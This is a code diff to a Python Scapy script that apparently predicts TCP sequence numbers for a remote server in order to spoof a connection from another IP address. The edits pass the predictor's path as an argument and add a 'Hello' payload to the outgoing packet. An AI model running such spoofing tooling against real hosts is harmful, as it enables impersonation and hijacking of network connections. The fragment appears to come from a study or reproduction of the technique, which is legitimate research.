@@ -14,22 +14,23 @@ remote_ip = sys.argv[3]
 remote_port = sys.argv[4]
 spoof_ip = sys.argv[5]
 spoof_port = sys.argv[6]
+seq_create = sys.argv[7]
 
 #determine sequence numbers ahead-of-time to reduce delay before spoof
 #local_ip here is dest_ip for server
-seq_num_output_current = subprocess.check_output(["repro_seq/seq_create", remote_ip, remote_port, local_ip, local_port])
+seq_num_output_current = subprocess.check_output([seq_create, remote_ip, remote_port, local_ip, local_port])
 
-seq_num_output_spoof = subprocess.check_output(["repro_seq/seq_create", remote_ip, remote_port, spoof_ip, spoof_port])
+seq_num_output_spoof = subprocess.check_output([seq_create, remote_ip, remote_port, spoof_ip, spoof_port])
 
 print(seq_num_output_current)
 print(seq_num_output_spoof)
 
 #create connection to server and record sequence number
 
-leg_outbound_ip = IP(dst=remote_ip, src=local_ip)
+leg_outbound_ip = IP(src=local_ip, dst=remote_ip)
 #leg_outbound_tcp = TCP(sport=int(local_port), dport=int(remote_port))
 leg_outbound_tcp = TCP(dport=int(remote_port))
-packet = leg_outbound_ip/leg_outbound_tcp
+packet = leg_outbound_ip/leg_outbound_tcp/'Hello\n'
 response, non_response = sr1(packet)
 print(response.summary())
 
